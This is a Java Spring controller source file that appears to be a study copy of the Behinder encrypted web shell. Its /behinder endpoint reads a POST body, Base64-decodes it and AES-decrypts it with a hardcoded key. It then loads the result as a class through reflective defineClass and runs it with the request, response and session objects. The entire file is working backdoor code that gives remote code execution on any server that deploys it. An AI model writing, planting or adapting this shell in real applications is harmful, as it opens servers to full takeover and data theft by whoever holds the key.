package com.sorry.bug.controller;

import com.sun.tools.internal.ws.wsdl.document.soap.SOAPUse;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * created by 0x22cb7139 on 2021/6/22
 */

@Controller
public class BehinderController {
    @RequestMapping("/behinder")
    public void execute(HttpServletRequest req, HttpServletResponse rsp)  {
        try{
            //1.设定密钥
            //字符串内容比较equals
            if(req.getMethod().equals("POST")){
                String k = "b5b97659fa241126";//p1k2
                //2.获取request并base64解密再aes解密
                req.getSession().setAttribute("u", k);
                String bis = req.getReader().readLine();
                System.out.println(bis);
                Cipher c  = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                byte[] evil = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bis));
                //3.defineclass将其实例化
                Method defineclass = this.getClass().getClassLoader().loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass",byte[].class,Integer.TYPE,Integer.TYPE);
                defineclass.setAccessible(true);
                Class<?> clazz = (Class<?>) defineclass.invoke(this.getClass().getClassLoader(),evil,0,evil.length);
                Object obj = clazz.newInstance();
                Map<String,Object> pageContext = new HashMap<String,Object>();
                pageContext.put("request",req);
                pageContext.put("response",rsp);
                pageContext.put("session",req.getSession());
                //4.调用equals方法
                obj.equals(pageContext);
                System.out.println("随机类名:"+obj.getClass().getName());
                return ;
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}

